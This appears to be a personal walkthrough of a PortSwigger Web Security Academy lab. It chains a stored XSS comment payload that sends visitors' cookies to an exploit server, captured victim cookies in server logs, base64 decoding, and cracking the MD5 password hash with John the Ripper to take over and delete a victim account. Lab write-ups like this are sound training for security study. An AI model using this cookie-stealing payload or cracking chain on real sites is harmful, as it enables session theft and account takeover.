login as `wiener`

grab the url of "exploit server" (https://exploit-0a1100a503bbf2c281167f4001e60033.exploit-server.net/)


in one of the posts, put this payload:

```html
<img src="x" onerror=this.src='https://exploit-0a1100a503bbf2c281167f4001e60033.exploit-server.net/?'+document.cookie;>
```


```html
POST /post/comment HTTP/2
Host: 0ab2008503e9f2d08139809a000900ed.web-security-academy.net
Cookie: session=pFBp6Ss2fbVRyzyLKJCeEwSt3Wm9M83h
Content-Length: 208
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: it-IT,it;q=0.9
Origin: https://0ab2008503e9f2d08139809a000900ed.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ab2008503e9f2d08139809a000900ed.web-security-academy.net/post?postId=9
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

postId=9&comment=%3Cimg+src%3D%22x%22+onerror%3Dthis.src%3D%27https%3A%2F%2Fexploit-0a1100a503bbf2c281167f4001e60033.exploit-server.net%2F%3F%27%2Bdocument.cookie%3B%3E&name=sugo&email=sugo%40sugo.it&website=
```

check to logs of exploit server

```bash
10.0.3.242      2025-02-28 19:07:51 +0000 "GET /?secret=aXHkzqyDpH07dw6eNB5VGNd0qJGVYt8x;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
10.0.3.242      2025-02-28 19:07:51 +0000 "GET /?secret=aXHkzqyDpH07dw6eNB5VGNd0qJGVYt8x;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
10.0.3.242      2025-02-28 19:07:51 +0000 "GET /?secret=aXHkzqyDpH07dw6eNB5VGNd0qJGVYt8x;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
10.0.3.242      2025-02-28 19:07:51 +0000 "GET /?secret=aXHkzqyDpH07dw6eNB5VGNd0qJGVYt8x;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
10.0.3.242      2025-02-28 19:07:51 +0000 "GET /?secret=aXHkzqyDpH07dw6eNB5VGNd0qJGVYt8x;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
10.0.3.242      2025-02-28 19:07:51 +0000 "GET /?secret=aXHkzqyDpH07dw6eNB5VGNd0qJGVYt8x;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
10.0.3.242      2025-02-28 19:07:51 +0000 "GET /?secret=aXHkzqyDpH07dw6eNB5VGNd0qJGVYt8x;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
10.0.3.242      2025-02-28 19:07:51 +0000 "GET /?secret=aXHkzqyDpH07dw6eNB5VGNd0qJGVYt8x;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
..
..
```

pick the `stay-logged-in` cookie: `Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz`

decode it:

```bash
joshua@kaligra:~$ echo -n "Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz" | base64 -d
carlos:26323c16d5f4dabff3bb136f2460a943
```

try to crack with this wordlist:

https://portswigger.net/web-security/authentication/auth-lab-passwords

...password not found :)

let's try with `rockyou.txt` wordlist:

```bash
$ john hash --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
onceuponatime    (?)
1g 0:00:00:00 DONE (2025-02-28 20:14) 20.00g/s 2327Kp/s 2327Kc/s 2327KC/s overit1..mybaby09
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

access with `carlos:onceuponatime` and delete account.

Solved!



